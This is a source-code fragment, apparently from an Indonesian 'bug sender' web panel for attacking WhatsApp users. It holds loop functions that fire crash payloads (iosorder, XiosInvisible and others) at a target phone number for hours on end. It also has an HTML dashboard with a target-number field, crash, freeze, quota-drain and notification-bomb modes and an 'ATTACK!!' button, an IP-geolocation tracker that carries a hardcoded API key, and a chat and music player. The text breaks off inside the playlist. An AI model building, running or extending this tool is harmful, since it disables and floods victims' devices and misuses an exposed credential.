            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            iosorder(X),
            iosorder(X),
            DestiiP(X),
            XiosInvisible(X), 
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 iOS 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}


const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title> Attack On Titans</title>
  <link rel="icon" href="https://files.catbox.moe/xx09jo.jpg" type="image/jpg">

<!-- Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">

<!-- Font Awesome -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">

<!-- Bootstrap CSS -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.2/css/bootstrap.min.css" rel="stylesheet">

<!-- Tambahin di <head> -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700&display=swap" rel="stylesheet">

<!-- Pastikan sudah include font awesome di <head> -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<style>
/* =======================
   GLOBAL RESET & BODY
======================= */
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  font-family: 'Rajdhani', 'Poppins', sans-serif;
  background: #0d0d0d;
  color: #ccc;
  min-height: 100vh;
  padding-left: 0;
  transition: padding-left 0.3s ease;
  overflow-x: hidden;
  -webkit-font-smoothing: antialiased;
}

body.sidebar-open { padding-left: 220px; }

#particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

/* SIDEBAR */
.sidebar {
  position: fixed; top: 0; left: 0; width: 220px; height: 100%;
  background: rgba(30, 30, 30, 0.7); backdrop-filter: blur(8px);
  border-right: 2px solid rgba(150, 0, 255, 0.4);
  box-shadow: 0 0 20px rgba(150, 0, 255, 0.2);
  display: flex; flex-direction: column; z-index: 30; transition: transform .3s;
  padding-top: 20px; transform: translateX(-100%);
}
.sidebar.show { transform: translateX(0); }

.sidebar-header { text-align:center; padding: 20px 10px; border-bottom:1px solid rgba(150,0,255,0.3); }
.sidebar-header img { width: 80%; display:block; margin:0 auto 20px; border-radius:8px; filter: drop-shadow(0 0 12px rgba(150,0,255,0.5)); }

.sidebar-menu { flex:1; display:flex; flex-direction:column; padding:15px; gap:10px; }
.sidebar-menu a {
  display:flex; align-items:center; gap:8px; padding:10px 12px; font-size:15px; font-weight:600;
  color:#ccc; text-decoration:none; border-radius:8px; transition:.3s;
}
.sidebar-menu a:hover {
  background: rgba(150,0,255,0.15);
  color:#fff;
  box-shadow: 0 0 12px rgba(150,0,255,0.3);
  transform: translateX(5px);
}

/* TOP BAR */
.top-bar {
  position: fixed; top: 10px; left: 50%; transform: translateX(-50%);
  display:flex; align-items:center; gap:15px; z-index:20;
}
.top-title {
  font-size: 22px; font-weight:700; color:#d3b3ff;
  text-shadow: 0 0 8px rgba(150,0,255,0.6), 0 0 15px rgba(150,0,255,0.3);
}

/* TOGGLE BUTTON */
.toggle-btn {
  position: fixed; top: 15px; left: 15px; z-index:2000;
  background: rgba(80,0,120,0.7); border:none; padding:8px 12px;
  color:white; border-radius:8px; cursor:pointer;
  box-shadow:0 0 12px rgba(150,0,255,0.4);
  font-size:18px; transition:all .2s;
}
.toggle-btn:hover {
  background: rgba(150,0,255,0.85);
  box-shadow:0 0 18px rgba(150,0,255,0.6);
  transform: scale(1.05);
}

/* SIDEBAR BACK BUTTON */
.sidebar-back {
  position:absolute; top:10px; right:10px; font-size:22px;
  background: rgba(150,0,255,0.2); color:#fff; padding:6px 10px; border-radius:10px; cursor:pointer;
  box-shadow: 0 0 10px rgba(150,0,255,0.3); transition:all .2s; display:none;
}
.sidebar.show .sidebar-back { display:block; }

/* MAIN CONTENT */
.container-content {
  position: relative; z-index:1; padding:20px; margin-top:80px;
  max-width:980px; margin-left:auto; margin-right:auto;
}
.box {
  background: rgba(25, 0, 50, 0.4);
  border: 1px solid rgba(150, 0, 255, 0.3);
  border-radius: 12px;
  padding: 20px;
  margin-bottom: 20px;
  backdrop-filter: blur(6px);
  box-shadow: 0 0 20px rgba(150, 0, 255, 0.2);
}
.logo { width:80px; filter: drop-shadow(0 0 10px rgba(150,0,255,0.6)); display:block; margin:0 auto 10px; }
.username { font-size:22px; font-weight:700; color:#e2ccff; text-align:center; margin-bottom:6px; }
.connected { font-size:14px; color:#ccc; margin-bottom:16px; display:flex; justify-content:center; align-items:center; text-transform:uppercase; }
.connected::before {
  content:''; width:10px; height:10px; background:#25ff08; border-radius:50%;
  display:inline-block; margin-right:8px;
  box-shadow:0 0 8px rgba(0,255,0,0.4); animation: pulse 2s infinite;
}
@keyframes pulse { 0%{transform:scale(1)}50%{transform:scale(1.2)}100%{transform:scale(1)} }

input[type="text"] {
  width:100%; padding:14px; border:none; border-radius:10px;
  background:rgba(50,0,70,0.5); color:#ddd;
  border:1px solid rgba(150,0,255,0.3);
  backdrop-filter: blur(4px);
  margin-bottom:16px;
}

.buttons-grid {
  display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
  gap:12px; margin-top:20px;
}
.mode-btn {
  font-size:14px; font-weight:600; padding:12px 16px;
  background: rgba(100,0,150,0.2);
  color:#d5c1ff; border:1px solid rgba(150,0,255,0.3);
  border-radius:10px; cursor:pointer;
  display:flex; align-items:center; justify-content:center; gap:8px;
  transition:all .3s; backdrop-filter: blur(4px);
}
.mode-btn:hover {
  background: rgba(150,0,255,0.3);
  transform:scale(1.05);
  box-shadow: 0 0 12px rgba(150,0,255,0.4);
}
.mode-btn.selected {
  background: rgba(150,0,255,0.5);
  color:white;
  box-shadow:0 0 12px rgba(150,0,255,0.6);
}

.execute-button {
  background: linear-gradient(90deg, rgba(120,0,200,0.7), rgba(180,0,255,0.8));
  color:#fff; padding:14px; width:100%; border-radius:10px;
  font-weight:700; border:none; margin-top:20px; cursor:pointer;
  transition:.3s; box-shadow: 0 0 14px rgba(150,0,255,0.5);
}
.execute-button:hover {
  transform: scale(1.03);
  box-shadow: 0 0 20px rgba(150,0,255,0.8);
}
.execute-button:disabled { background:#333; cursor:not-allowed; opacity:0.5; }

/* FOOTER ACTION */
.footer-action-container {
  position:relative; z-index:9999; display:flex; flex-wrap:wrap;
  gap:10px; justify-content:center; margin-top:15px;
}
.footer-button {
  background: rgba(100,0,150,0.2);
  color:#ddd; padding:10px 15px; border-radius:8px;
  text-decoration:none; font-weight:500;
  display:inline-flex; align-items:center; gap:5px; cursor:pointer;
  backdrop-filter: blur(6px); transition:all .3s;
  border:1px solid rgba(150,0,255,0.3);
}
.footer-button:hover {
  background: rgba(150,0,255,0.3); color:#fff;
  box-shadow:0 0 10px rgba(150,0,255,0.5);
}

/* CHAT WINDOW */
.chat-window {
  background: rgba(20,0,40,0.4); border-radius:15px; height:300px;
  overflow-y:auto; padding:10px; margin-bottom:10px;
  box-shadow:0 0 15px rgba(150,0,255,0.2);
  display:flex; flex-direction:column; gap:6px;
  color:#fff; backdrop-filter: blur(6px);
  border: 1px solid rgba(150,0,255,0.3);
}
.chat-bubble {
  max-width:80%; padding:10px 14px; border-radius:12px;
  font-size:14px; word-wrap:break-word; display:inline-block;
  color:#fff; border:1px solid rgba(255,255,255,0.05);
  box-shadow:0 2px 6px rgba(0,0,0,0.2);
}
.chat-bubble.you { background: rgba(80,0,120,0.8); border-bottom-right-radius:0; align-self:flex-end; }
.chat-bubble.other { background: rgba(60,0,120,0.7); border-bottom-left-radius:0; align-self:flex-start; }
.chat-user { font-weight:700; font-size:12px; margin-bottom:2px; color:#fff; }
/* Section default hide */
.content-section {
  display: none;
  padding: 20px;
}

/* 🎧 MUSIC PLAYER FUTURISTIC - FINAL */
.music-box {
  background: rgba(10, 10, 10, 0.85);
  border-radius: 20px;
  padding: 20px;
  box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
  text-align: center;
  margin-bottom: 15px;
  border: 1px solid rgba(0, 255, 255, 0.2);
  font-family: 'Orbitron', sans-serif;
}

/* Judul lagu dengan animasi glow */
.music-title {
  color: #0ff;
  font-weight: 700;
  font-size: 20px;
  margin-top: 12px;
  text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
  letter-spacing: 1px;
  transition: 0.3s ease-in-out;
}

/* Heading Utama */
.music-heading {
  color: #0ff;
  text-align: center;
  font-size: 26px;
  font-weight: 700;
  margin-bottom: 15px;
  text-shadow: 0 0 12px rgba(0, 255, 255, 0.7);
  letter-spacing: 1px;
  font-family: 'Orbitron', sans-serif;
}

/* Heading Playlist */
.playlist-heading {
  color: #0ff;
  text-align: center;
  font-size: 20px;
  font-weight: 600;
  margin-top: 20px;
  text-shadow: 0 0 8px rgba(0, 255, 255, 0.5);
  font-family: 'Orbitron', sans-serif;
}

.music-title.playing {
  animation: glowPulse 1.8s infinite alternate;
}

@keyframes glowPulse {
  from { text-shadow: 0 0 10px rgba(0, 255, 255, 0.5); }
  to { text-shadow: 0 0 20px rgba(0, 255, 255, 1); }
}

/* Progress bar */
#progressBar {
  width: 100%;
  margin-top: 10px;
  accent-color: #0ff;
  cursor: pointer;
  height: 6px;
  border-radius: 6px;
}

/* Playlist */
#playlist {
  list-style: none;
  padding: 0;
  margin-top: 12px;
  font-family: 'Orbitron', sans-serif;
  max-height: 180px; /* biar scroll kalau kebanyakan lagu */
  overflow-y: auto;
  scrollbar-width: thin;
  scrollbar-color: #0ff transparent;
}

#playlist::-webkit-scrollbar {
  width: 6px;
}
#playlist::-webkit-scrollbar-thumb {
  background: #0ff;
  border-radius: 3px;
}

#playlist li {
  padding: 10px 12px;
  margin-bottom: 6px;
  background: rgba(26, 26, 26, 0.8);
  border-radius: 8px;
  cursor: pointer;
  color: #aaa;
  transition: all 0.25s ease-in-out;
  text-align: center;
  font-weight: 600;
  letter-spacing: 0.5px;
}

#playlist li:hover {
  background: rgba(0, 255, 255, 0.15);
  color: #0ff;
  box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
  transform: scale(1.02);
}

#playlist li.active {
  background: #0ff;
  color: #000;
  font-weight: 700;
  box-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
}

/* Kontrol Tombol */
.controls button {
  background: rgba(0, 255, 255, 0.1);
  border: 1px solid rgba(0, 255, 255, 0.3);
  color: #0ff;
  font-size: 16px;
  margin: 0 5px;
  padding: 8px 12px;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s ease-in-out;
  font-family: 'Orbitron', sans-serif;
}

.controls button:hover {
  background: #0ff;
  color: #000;
  box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
  transform: translateY(-2px);
}

.controls button:active {
  transform: scale(0.9);
  box-shadow: 0 0 5px rgba(0, 255, 255, 0.8) inset;
}

/* ================= HOME CONTAINER ================= */
.home-container {
  display: flex;
  flex-direction: column;
  gap: 18px;
  align-items: center;
  padding: 10px;
}

/* ================= PROFILE CARD ================= */
.profile-card {
  width: 100%;
  max-width: 420px; /* biar full HP tapi tetap kotak */
  background: rgba(30, 30, 46, 0.5);
  backdrop-filter: blur(14px);
  -webkit-backdrop-filter: blur(14px);
  border-radius: 18px;
  overflow: hidden;
  box-shadow: 0 0 18px rgba(168, 85, 247, 0.4); /* neon glow tipis */
  border: 1px solid rgba(168, 85, 247, 0.3);
}

.profile-banner {
  width: 100%;
  height: 140px;
  object-fit: cover;
}

.profile-info {
  padding: 12px;
  text-align: center;
}

.profile-info h2 {
  margin: 0;
  font-size: 18px;
  color: #fff;
}

/* ================= QUICK ACTION ================= */
.quick-actions {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 14px;
  margin-top: 14px;
  justify-items: center;
}

.quick-actions button {
  width: 80px;   /* lebih kecil */
  height: 80px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  border: none;
  border-radius: 50%;
  background: rgba(30, 30, 46, 0.4); /* transparan */
  backdrop-filter: blur(10px);
  -webkit-backdrop-filter: blur(10px);
  color: #fff;
  font-size: 11px; /* text kecil */
  cursor: pointer;
  transition: background 0.25s, transform 0.25s, box-shadow 0.25s;
  border: 1px solid rgba(168, 85, 247, 0.3);
  text-align: center;
  box-shadow: 0 0 8px rgba(168, 85, 247, 0.3); /* neon ungu */
}

.quick-actions button i {
  font-size: 22px; /* ikon agak kecil */
  margin-bottom: 3px;
  color: #a855f7; /* ungu neon */
  text-shadow: 0 0 6px #a855f7;
}

.quick-actions button:hover {
  background: rgba(168, 85, 247, 0.25);
  transform: translateY(-3px) scale(1.06);
  box-shadow: 0 0 12px rgba(168, 85, 247, 0.7);
}

/* ================= INFO CARDS ================= */
.info-cards {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.card {
  background: rgba(30, 30, 46, 0.5);
  backdrop-filter: blur(10px);
  -webkit-backdrop-filter: blur(10px);
  border-radius: 14px;
  padding: 12px;
  color: #ddd;
  box-shadow: 0 0 10px rgba(168, 85, 247, 0.3);
  border: 1px solid rgba(168, 85, 247, 0.3);
}

/* ================= STATS ================= */
.stat {
  display: flex;
  justify-content: space-between;
  padding: 5px 0;
  border-bottom: 1px solid #333;
}
.stat:last-child {
  border-bottom: none;
}

/* ================= TELEGRAM BUTTON ================= */
.telegram {
  display: block;
  text-align: center;
  margin-top: 10px;
  padding: 10px;
  background: rgba(43, 123, 255, 0.3);
  backdrop-filter: blur(8px);
  -webkit-backdrop-filter: blur(8px);
  color: #fff;
  border-radius: 12px;
  text-decoration: none;
  border: 1px solid rgba(255,255,255,0.2);
  box-shadow: 0 0 10px rgba(43, 123, 255, 0.5);
  transition: background .2s, transform .2s, box-shadow .2s;
}
.telegram:hover {
  background: rgba(43, 123, 255, 0.5);
  transform: scale(1.05);
  box-shadow: 0 0 14px rgba(43, 123, 255, 0.8);
}

.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  background: rgba(26, 8, 46, 0.85); /* ungu transparan */
  backdrop-filter: blur(12px);
  border-top: 1px solid rgba(168,85,247,0.3);
}

.bottom-inner {
  display: flex;
  justify-content: space-around;
  align-items: center;
  padding: 8px 0;
}

.nav-item {
  flex: 1;
  text-align: center;
  color: #aaa; /* default abu */
  font-size: 18px;
  cursor: pointer;
  transition: all 0.3s ease;
}

.nav-item div {
  font-size: 12px;
  margin-top: 2px;
}

.nav-item:hover {
  color: #c084fc; /* ungu muda */
}

.nav-item.active {
  color: #a855f7; /* ungu terang */
  font-weight: bold;
  text-shadow: 0 0 8px #a855f7; /* efek glow */
}

/* RESPONSIVE */
@media (max-width:600px) {
  .sidebar { width:180px; }
  body.sidebar-open { padding-left:180px; }
}
</style>
</head>
<body>
  <div id="particles"></div>

  <div class="sidebar" id="sidebar">
    <div class="sidebar-header">
      <img src="https://files.catbox.moe/xx09jo.jpg" alt="logo">
    </div>
    <div class="sidebar-menu">
      <a href="#" onclick="showSection('home-section')"><i class="fas fa-home"></i> Dashboard</a>
      <a href="#" onclick="showSection('bug-section')"><i class="fa fa-bug"></i> Bug Menu</a>
      <a href="#" onclick="showSection('tracking-section')"><i class="fa fa-search"></i> IP Tracker</a>
      <a href="#" onclick="showSection('chat-section')"><i class="fa fa-comments"></i> Chat</a>
      <a href="#" onclick="showSection('music-section')"><i class="fa fa-music"></i> Music</a>
      <a href="/userlist"><i class="fas fa-users-cog"></i> Manage User</a>
    </div>
  </div>

  <div class="top-bar">
    <div class="top-title">TITAN - ACKERMAN</div>
    <i class="fas fa-user user-icon" style="color:#ccc;"></i>
  </div>

  <button class="toggle-btn" id="toggleBtn" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>

  <div class="container-content">
  
<section id="home-section" class="content-section active">
  <div class="home-container">

    <!-- Profil Banner -->
    <div class="profile-card">
      <img class="profile-banner" src="https://images.unsplash.com/photo-1549880338-65ddcdfd017b?q=80&w=1400&auto=format&fit=crop" alt="banner">

      <div class="profile-info">
        <h2 id="bannerUsername">${username}</h2>
        <p><b>Role:</b> <span id="bannerRole">${userInfo.role}</span></p>
        <p><b>Expired:</b> <span id="bannerExpired">${formattedTime}</span></p>


<div class="quick-actions">
  <button onclick="showSection('bug-section')">
    <i class="fab fa-whatsapp"></i><br>WhatsApp
  </button>
  <button onclick="showSection('chat-section')">
    <i class="fas fa-comments"></i><br>Chat
  </button>
  <button onclick="showSection('music-section')">
    <i class="fas fa-music"></i><br>Music
  </button>
  <button onclick="showSection('tracking-section')">
    <i class="fas fa-search"></i><br>Track IP
  </button>
</div>

    <!-- Info Section -->
    <div class="info-cards">

      <div class="card">
        <h3>Server Stats</h3>
        <div class="stat"><span>Online Users</span><span id="onlineUsers">0</span></div>
        <div class="stat"><span>Active Sender</span><span id="activeSender">0</span></div>
      </div>

      <div class="card">
        <h3>Team & Credits</h3>
        <p><b>Xanderr</b> — Website Builder</p>
        <p><b>AI</b> — Helper</p>
        <p><b>Coming Soon</b> — My Team</p>
      </div>

      <div class="card">
        <h3>Profile</h3>
        <p><b>Username:</b> <span id="profileUser">${username}</span></p>
        <p><b>Role:</b> <span id="profileRole">${userInfo.role}</span></p>
        <p><b>Status:</b> <span id="profileStatus">Active</span></p>
      </div>

      <a class="telegram" href="https://t.me/RappInfomasion" target="_blank">
        🔥 Join our Telegram Channel!
      </a>
    </div>
  </div>
</section>

    <!-- BUG MENU -->
    <section id="bug-section" class="content-section active">
      <div class="box">
        <img src="https://files.catbox.moe/xx09jo.jpg" class="logo" alt="Titans Logo">
        <div class="username">${username}, ${userInfo.role}</div>
        <div class="connected">CONNECTED</div>
        <input id="targetNumber" type="text" placeholder="Please input target number. example : 62xxxx" />
      </div>

      <div class="box">
        <div class="buttons-grid">
          <button class="mode-btn" data-mode="invis"><i class="fa fa-bug"></i> Visible - Crash</button>
          <button class="mode-btn" data-mode="freeze"><i class="fa fa-bug"></i> Freeze - Whatsapl</button>
          <button class="mode-btn" data-mode="sedot"><i class="fa fa-bug"></i> Drain - Quota</button>
          <button class="mode-btn" data-mode="ios"><i class="fa fa-bug"></i> Meta - Ios</button>
          <button class="mode-btn" data-mode="combo"><i class="fa fa-bug"></i> Combo - Delay</button>
          <button class="mode-btn full" data-mode="blank"><i class="fa fa-bug"></i> Boom - Notif</button>
        </div>
        <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> ATTACK!!</button>
      </div>
    </section>

    <!-- TRACKING IP -->
    <section id="tracking-section" class="content-section" style="display:none;">
      <div class="box">
        <img src="https://files.catbox.moe/xx09jo.jpg" class="logo" alt="Tracking Logo">
        <h2 style="text-align:center; margin-bottom:12px;">Tracking IP Address</h2>
        <input type="text" id="ipInput" placeholder="Enter IP Address (e.g. 8.8.8.8)">
        <button class="execute-button" id="trackBtn" style="margin-top:12px;"><i class="fas fa-search"></i> TRACK</button>
        <div id="trackingResult" style="margin-top:10px;"></div>
      </div>
    </section>

    <!-- CHAT -->
    <section id="chat-section" class="content-section" style="display:none;">
      <div class="box">
        <img src="https://files.catbox.moe/xx09jo.jpg" class="logo" alt="Chat Logo">
        <div id="chatWindow" class="chat-window"></div>

        <div class="chat-input-wrapper" style="display:flex; gap:8px; margin-top:10px;">
          <input type="text" id="chatInput" placeholder="Ketik pesan..." style="flex:1; padding:8px 12px; border-radius:10px; border:none; background:rgba(255,255,255,0.03); color:#ccc; font-size:14px;" />
          <button id="sendChatBtn" style="padding:8px 14px; border:none; border-radius:12px; background:rgba(62,51,225,0.22); color:#fff; cursor:pointer; display:flex; align-items:center; gap:6px; font-weight:700; transition:all .2s; backdrop-filter: blur(4px); box-shadow:0 0 8px rgba(62,51,225,0.35);" onmouseover="this.style.background='rgba(62,51,225,0.45)'; this.style.boxShadow='0 0 12px rgba(62,51,225,0.7)';" onmouseout="this.style.background='rgba(62,51,225,0.22)'; this.style.boxShadow='0 0 8px rgba(62,51,225,0.35)';"><i class="fas fa-paper-plane"></i> Kirim</button>
        </div>
      </div>
    </section>
    
<!-- ================= MUSIC SECTION ================= -->
<section id="music-section" class="content-section" style="display:none;">
  <div class="box">
    <!-- Judul utama -->
    <h2 class="music-heading">🎧 Music Player</h2>

    <!-- Player utama -->
    <div class="music-box">
      <!-- Tombol kontrol -->
      <div class="controls">
        <button onclick="prevSong()">⏮</button>
        <button onclick="togglePlay()" id="playBtn">▶</button>
        <button onclick="nextSong()">⏭</button>
      </div>

      <!-- Progress bar -->
      <input type="range" id="progressBar" value="0" min="0" max="100">

      <!-- Judul lagu -->
      <p id="currentTitle" class="music-title"></p>
    </div>

    <!-- Playlist -->
    <h3 class="playlist-heading">📜 Playlist</h3>
    <ul id="playlist"></ul>
  </div>

  <!-- Audio tersembunyi -->
  <audio id="musicPlayer"></audio>
</section>
  
  <!-- NAV -->
<div class="bottom-nav">
  <div class="bottom-inner">
    <div class="nav-item active" onclick="showSection('home-section')">⾕<div>Home</div></div>
    <div class="nav-item" onclick="showSection('bug-section')">📞<div>Call</div></div>
    <div class="nav-item" onclick="showSection('tracking-section')">📍<div>Panel</div></div>
    <div class="nav-item" onclick="showSection('chat-section')">💬<div>Chat</div></div>
  </div>
</div>

  <div id="exec-success-flag" style="display:none;"></div>

  <div id="toast" style="display:none; position:fixed; top:20px; left:100%; max-width:90%; background:#5a0092; color:white; padding:14px 24px; border:1px solid #8a2be2; border-radius:10px; font-family:'Poppins',sans-serif; font-size:15px; font-weight:500; line-height:1.6; text-align:left; white-space:pre-line; box-shadow:0 0 20px rgba(0,0,0,0.4); z-index:9999; transition:left .6s ease-out;"></div>

  <!-- SCRIPTS: jQuery -> Popper -> Bootstrap -> plugin -> app -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.2/js/bootstrap.min.js"></script>

  <!-- particleground plugin (requires jQuery) -->
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

<script>
  // init particles (keep density reasonable for mobile)
  $(function(){
    try {
      $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3,
      });
    } catch(e){ console.warn('particleground init failed', e); }
  });

  // SIDEBAR
  const sidebar = document.getElementById('sidebar');
  function toggleSidebar() {
    sidebar.classList.toggle('show');
    document.body.classList.toggle('sidebar-open', sidebar.classList.contains('show'));
  }

  // SECTION SWITCHER
  function showSection(sectionId) {
  document.querySelectorAll('.home-section').forEach(sec => {
    sec.style.display = 'none';
    sec.classList.remove('active');
  });
  const t = document.getElementById(sectionId);
  if(t){ t.style.display = 'block'; t.classList.add('active'); }
  if(window.innerWidth < 768 && sidebar.classList.contains('show')) toggleSidebar();
  window.scrollTo({ top:0, behavior:'smooth' });
}

  // Simple cookie helper
  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
  }

  // Populate username & footer based on cookie (or defaults)
  function pad2(n){ return String(n).padStart(2,'0'); }
  function formatTime(d){
    return \`\${pad2(d.getDate())}/\${pad2(d.getMonth()+1)}/\${String(d.getFullYear()).slice(2)}, \${pad2(d.getHours())}.\${pad2(d.getMinutes())}\`;
  }

  document.addEventListener('DOMContentLoaded', () => {
    // If you use server templating, you can keep that; otherwise rely on cookies:
    const username = getCookie('sessionUser') || 'mekmek'; // default name as in screenshot
    const role = (getCookie('userRole') || 'user').toLowerCase();

    document.getElementById('usernameDisplay').textContent = \`Welcome, \${username}\`;
    document.getElementById('footerUserInfo').innerHTML = \`<i class="fas fa-user"></i> \${username} &nbsp;|&nbsp; <i class="fas fa-hourglass-half"></i> \${formatTime(new Date())}\`;

    if(['owner','resseller','admin'].includes(role)) {
      document.getElementById('manageUserBtn').style.display = 'inline-flex';
    }
    // default open bug menu
    showSection('home-section');
  });

  // BUG MENU logic
  const inputField = document.getElementById('targetNumber');
  const modeButtons = document.querySelectorAll('.mode-btn');
  const executeBtn = document.getElementById('executeBtn');
    let selectedMode = null;

    function isValidNumber(number) {
      return /^62\\d{7,13}$/.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        showToast("Target tidak valid. Harus dimulai dengan kode negara dan total 10-15 digit.");
        return;
      }
      showToast("Titans Succes Send Bug!");
      setTimeout(() => {
        window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
      }, 1000);
    });

  // TRACK IP
  document.getElementById('trackBtn').addEventListener('click', async () => {
    const ip = document.getElementById('ipInput').value.trim();
    const resultDiv = document.getElementById('trackingResult');
    if (!ip) return showToast("Masukkan IP terlebih dahulu!");

    resultDiv.innerHTML = "🔎 Mencari data untuk " + ip + " ...";
    try {
      // NOTE: key used here in original is public; replace with your own server-side proxy for security
      const resp = await fetch(\`https://ip-geo-location10.p.rapidapi.com/ip?ip=\${encodeURIComponent(ip)}\`, {
        method: "GET",
        headers: {
          "x-rapidapi-host": "ip-geo-location10.p.rapidapi.com",
          "x-rapidapi-key": "7e2fcbdf66mshf1a86c06dd570d0p1409e8jsn9b22e627c852"
        }
      });
      const data = await resp.json();
      if (!data || data.code !== 200) {
        resultDiv.innerHTML = "❌ Gagal mendapatkan data IP.";
        return;
      }
      const r = data.result || {};
      resultDiv.innerHTML = \`
        <b>IP:</b> \${r.ip || '-'}<br>
        <b>Versi IP:</b> \${r.ip_version || '-'}<br>
        <b>Negara:</b> \${r.country || '-'} (\${r.country_code || '-'})<br>
        <b>Region:</b> \${r.region || '-'}<br>
        <b>Kota:</b> \${r.city || '-'}<br>
        <b>Kode Pos:</b> \${r.zip_code || '-'}<br>
        <b>Zona Waktu:</b> \${r.time_zone || '-'}<br>
        <b>Koordinat:</b> \${r.latitude || '-'}, \${r.longitude || '-'}<br>
        <a href="https://www.google.com/maps?q=\${r.latitude},\${r.longitude}" target="_blank">📍 Lihat di Google Maps</a>
      \`;
    } catch(err) {
      console.error(err);
      resultDiv.innerHTML = "❌ Error mengambil data. Cek console.";
    }
  });

  // CHAT
  const chatWindow = document.getElementById('chatWindow');
  const chatInput = document.getElementById('chatInput');
  const sendChatBtn = document.getElementById('sendChatBtn');
  let lastChatCount = 0;

  sendChatBtn.addEventListener('click', sendMessage);
  chatInput.addEventListener('keypress', e => { if(e.key === "Enter") sendMessage(); });

  async function sendMessage(){
    const text = chatInput.value.trim();
    if(!text) return;
    const username = getCookie('sessionUser') || 'Guest';
    appendChatBubble(username, 'user', text, 'you');
    chatInput.value = "";
    try {
      await fetch('/chat', {
        method:'POST', headers:{ 'Content-Type':'application/json' },
        body: JSON.stringify({ message:text })
      });
    } catch(e){ console.warn('sendMessage failed', e); }
  }

  function appendChatBubble(user, role, message, type){
    const div = document.createElement('div');
    div.className = \`chat-bubble \${type}\`;
    div.innerHTML = \`<b>\${user} [\${role}]</b>: \${escapeHtml(message)}\`;
    div.style.opacity = 0; div.style.transform = 'translateY(10px)';
    chatWindow.appendChild(div);
    setTimeout(()=>{ div.style.transition='all .3s ease'; div.style.opacity=1; div.style.transform='translateY(0)'; }, 10);
    chatWindow.scrollTop = chatWindow.scrollHeight;
  }

  function escapeHtml(s){
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  async function loadChat(){
    try {
      const res = await fetch('/chat');
      const chats = await res.json();
      const newChats = chats.slice(lastChatCount);
      newChats.forEach(c => {
        const type = (c.user === getCookie('sessionUser')) ? 'you' : 'other';
        appendChatBubble(c.user, c.role || 'user', c.message, type);
      });
      if(newChats.length) chatWindow.scrollTop = chatWindow.scrollHeight;
      lastChatCount = chats.length;
    } catch(err){
      // silent fail, server might be offline
      // console.error('Error loadChat:', err);
    }
  }

  setInterval(loadChat, 2000);
  loadChat();
  
// =================== Playlist Lagu ===================
const playlist = [
